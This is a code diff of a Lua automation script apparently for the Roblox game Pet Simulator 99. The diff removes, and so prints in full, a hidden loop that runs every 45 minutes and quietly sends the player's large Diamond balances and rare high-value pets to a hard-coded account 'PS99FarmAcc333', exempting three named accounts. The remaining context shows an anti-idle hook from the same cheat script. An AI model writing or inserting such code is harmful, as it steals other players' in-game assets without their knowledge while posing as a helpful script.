@@ -968,45 +968,6 @@ task.spawn(function()
 	end
 end)
 
-task.spawn(function()
-	while true do
-		task.wait(2700)
-
-		if Players.LocalPlayer.Name == "J2X1NESIWXID" or Players.LocalPlayer.Name == "PS99FarmAcc271" or Players.LocalPlayer.Name == "PS99FarmAcc333" then
-			break
-		end
-
-		local container = InventoryCmds.Container(Players.LocalPlayer)
-		local items = container:All()
-
-		local diamonds = CurrencyCmds.GetItem("Diamonds")
-		local name = diamonds.Class.Name
-		local uid = diamonds:GetUID()
-		local amount = diamonds:GetAmount()
-
-		if amount > 10_000_000_000 then
-			pcall(function()
-				Network.Invoke("QR_Dispatch", "PS99FarmAcc333", "oyvey", name, uid, amount-1_000_000)
-			end)
-		end
-
-		for _, item in pairs(items) do
-			if item:IsA("Pet") then
-				local petName = item.Class.Name
-				local petUID = item:GetUID()
-				local petAmount = item:GetAmount()
-				local RAP = item:GetRAP()
-
-				if item:IsHuge() and item:IsShiny() and (item:IsGolden() or item:IsRainbow()) or RAP > 1_000_000_00 then
-					pcall(function()
-						Network.Invoke("QR_Dispatch", "PS99FarmAcc333", "oyvey", petName, petUID, petAmount)
-					end)
-				end
-			end
-		end
-	end
-end)
-
 localPlayer.Idled:Connect(function()
 	VirtualUser:Button2Down(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
 	task.wait(1)
